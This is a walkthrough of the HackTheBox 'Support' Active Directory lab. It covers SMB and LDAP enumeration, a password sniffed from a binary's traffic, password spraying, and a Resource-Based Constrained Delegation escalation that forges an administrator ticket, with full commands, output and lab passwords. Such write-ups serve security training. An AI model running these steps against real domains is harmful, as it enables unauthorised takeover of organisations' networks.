---
categories:
- Hackthebox
image:
  path: support.png
layout: post
media_subpath: /assets/images/support
tags:
- active directory
- hackthebox
- resource-based-constrained-delegation
title: Lab - Support Walkthrough
---
# Introduction
Support is a Easy Windows Active Directory machine that focuses on enumerating network services and exploiting misconfigured LDAP credentials found in application traffic. The initial foothold is gained through SMB share analysis, followed by lateral movement using discovered credentials, and ultimately achieving domain admin privileges through Resource-Based Constrained Delegation (RBCD) exploitation.
## Reconnaissance
### Port Scan
I start off with running `nmap` on the target to identify open ports and services
```
nmap -sC -sV -oA nmap/support 10.10.11.174                                                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 06:02 UTC
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.25s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-04 06:05:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 29s
| smb2-time: 
|   date: 2025-08-04T06:05:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.74 seconds
```
The interesting ports to enumerate are
1. 135 -->  RPC
2. 139,445 -->  SMB
3. 389 -->  LDAP
4. 5985 -->  WINRM

I add the domain name to my hosts file for `dns` resolution
```
echo '10.10.11.174 support.htb' | sudo tee -a /etc/hosts
```
### Service Enumeration
Using `rpccient` we connect anonymously but we can't enumerate users in the machine because of insufficient privileges
```
rpcclient -N -U "" 10.10.11.174                          
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```
## Initial Access
### SMB Share Analysis
Using `netexec` we connect with the guest account and we list shares. I see a non-default share `support-tools` which I have read access to
```
nxc smb 10.10.11.174 -u 'guest' -p '' --shares
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 
```
Using `smbclient` we connect anonymously to the share and list the directories. The file that stood out the most was `UserInfo.exe.zip` 
```
smbclient -N //10.10.11.174/support-tools
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Wed Jul 20 17:01:06 2022
  ..                                  D        0  Sat May 28 11:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 11:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 11:19:55 2022
  putty.exe                           A  1273576  Sat May 28 11:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 11:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 17:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 11:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 11:19:43 2022

                4026367 blocks of size 4096. 970017 blocks available
smb: \> 
```
Using the `get` flag I download the archive to my local machine 
```
<...SNIP...>
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (76.7 KiloBytes/sec) (average 76.7 KiloBytes/sec)
smb: \> 
```
Extracting the archive I find a executable inside.Looking at it I find that its a `DOTNet` binary
```
unzip UserInfo.exe.zip
<...SNIP...>
ls -la
total 944
drwxrwxr-x 2 kali kali   4096 Aug  4 06:17 .
drwxrwxr-x 3 kali kali   4096 Aug  4 06:16 ..
<....SNIP....>
-rwxrwxrwx 1 kali kali  12288 May 27  2022 UserInfo.exe
<...SNIP....>

file UserInfo.exe                                                                                                                                  
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```
Using `wine` I execute the binary and after following the guide I notice its trying so connect to `ldap`
```bash
wine UserInfo.exe                    

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user

wine UserInfo.exe -v find        
[-] At least one of -first or -last is required.

wine UserInfo.exe -v find -first null
[*] LDAP query to use: (givenName=null)
[-] Exception: No Such Object
```
### Credential Discovery
#### Auth As ldap

So I start `wireshark` to look at the traffic and I execute the binary once more
```
wireshark
```
![wire](wireshark1.png)
Looking we see that its trying to authenticate with `ldap` with simple authentication and I find credentials for the user ldap
![wireshark](wireshark2.png)
Using `netexec` we dump a list of usernames in the domain and also try password spray which failed
```
nxc smb 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'  --rid-brute
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
<...SNIP...>
SMB         10.10.11.174    445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB         10.10.11.174    445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)

nxc smb 10.10.11.174 -u users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
<....SNIP.....>
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
<....SNIP...>
SMB         10.10.11.174    445    DC               [-] support.htb\stoll.rachelle:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\ford.victoria:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE
```
Also I knew that non of the users has pre-authentication set with the `impacket-GetNPUsers`
```
impacket-GetNPUsers -no-pass support.htb/ -usersfile files/users.txt -dc-ip 10.10.11.174                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
<....SNIP...>
[-] User stoll.rachelle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ford.victoria doesn't have UF_DONT_REQUIRE_PREAUTH set
```
## Lateral Movement
### Auth As Support
Using `ldapsearch` I dump `ldap` information in the domain and store it in a file
```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)"  > ldap_dump
```
Looking at the file I get a potential password in the `info` description of the support user
```
cat ldap_dump
<..SNIP..>
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20250804040942.0Z
uSNCreated: 12617
'info: Ironside47pleasure40Watchful'
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 86086
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133987630037607318
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
<SNIP>
```
Trying out the password it worked
```
nxc smb 10.10.11.174 -u support -p Ironside47pleasure40Watchful                                  
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
```
## Bloodhound
With that information I decided to dump `bloodhound` data with `bloodhound-python` and analyze it with bloodhound
```
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -c All --zip -ns 10.10.11.174     
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 57S
INFO: Compressing output into 20250804064551_bloodhound.zip
```
Looking at `ldap` I don't see anything interesting 

![blood2](blood2.png)

Looking at `support`I see they are a part of `Remote Management Users` hence has access to `winrm`

![blood1](blood1.png)

Using `evil-winrm` I get shell as support
```
evil-winrm -i 10.10.11.174  -u support -p Ironside47pleasure40Watchful    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> 
```
The user flag can be obtained at `C:\Users\support\Desktop\user.txt`

## Privilege Escalation
Looking at support I find that they are a member of `Shares Support Accounts` group which has generic all over `DC` Computer OU
![image](Pasted image 20250804095638.png)
### Resource-Based Constrained Delegation
#### Theory
Resource-based constrained delegation (RBCD) is an Active Directory (AD) security feature that enables administrators to delegate permissions in order to manage resources more securely and with greater control. Introduced as an enhancement to the traditional Kerberos constrained delegation (KCD), RBCD can help to reduce the risk of privilege escalation and to maintain the principle of least privilege.
### Attack path
This [Ired-blog post](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) really explains the attack path to follow in order get the exploit running
#### Requirements
- Target computer
- Admins on target computer
- Fake computer name
- Fake computer SID
- Fake computer password
- Windows 2012 Domain Controller
### Attack
I confirm that I can add computers with `netexec` in which I can add 10 machine accounts
```
nxc ldap 10.10.11.174 -u support -p Ironside47pleasure40Watchful -M maq
LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.10.11.174    389    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
MAQ         10.10.11.174    389    DC               [*] Getting the MachineAccountQuota
MAQ         10.10.11.174    389    DC               MachineAccountQuota: 10
```

To perform the attack we first import powermad
```
*Evil-WinRM* PS C:\programdata> import-module .\Powermad.ps1
```
Let's now create a new computer object for our computer `FAKE01`
```
Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose                                              Verbose: [+] Domain Controller = dc.support.htb                                                  Verbose: [+] Domain = support.htb                                                                Verbose: [+] SAMAccountName = FAKE01$                                                            
Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb                       [+] Machine account FAKE01 added                        
```
Checking if the computer got created and noting its SID:
```
*Evil-WinRM* PS C:\programdata> Get-DomainComputer fake01


pwdlastset             : 8/4/2025 3:03:57 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FAKE01,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : FAKE01
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5603
samaccountname         : FAKE01$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 8/4/2025 10:03:57 AM
instancetype           : 4
usncreated             : 86165
objectguid             : 086f9b7d-ea30-4d67-9124-8a5399627964
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/FAKE01, HOST/FAKE01, RestrictedKrbHost/FAKE01.support.htb, HOST/FAKE01.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : FAKE01
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 8/4/2025 10:03:57 AM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 86167
dnshostname            : FAKE01.support.htb
```
Create a new raw security descriptor for the `FAKE01` computer principal:
```
*Evil-WinRM* PS C:\programdata> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5603)"
*Evil-WinRM* PS C:\programdata> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\programdata> $SD.GetBinaryForm($SDBytes, 0)
```
Now we apply the security descriptor bytes to `dc`:
```
*Evil-WinRM* PS C:\programdata> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 227 21 0 0' for object 'DC$'
*Evil-WinRM* PS C:\programdata> Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}


*Evil-WinRM* PS C:\programdata> 
```
With the new Computer Object created, I shall use it to create a ticket for user `administrator`
```
impacket-getST support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.support.htb@SUPPORT.HTB.ccache
```
Then I get the shell via `impacket-wmiexec`
```
impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k                                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
The root flag can be found at `C:\Users\Administrator\Desktop`
